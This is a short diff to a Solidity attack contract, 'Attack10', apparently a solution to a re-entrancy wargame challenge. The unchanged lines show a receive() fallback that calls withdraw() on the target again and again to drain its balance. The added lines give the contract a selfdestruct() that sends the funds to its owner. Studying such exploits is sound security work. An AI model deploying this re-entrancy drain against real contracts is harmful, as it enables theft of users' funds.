@@ -19,6 +19,10 @@ contract Attack10 {
         reentrance.withdraw(amount);
     }
 
+    function destroy() public {
+        selfdestruct(owner);
+    }
+
     receive() external payable {
         if (address(reentrance).balance > amount) {
             reentrance.withdraw(amount);
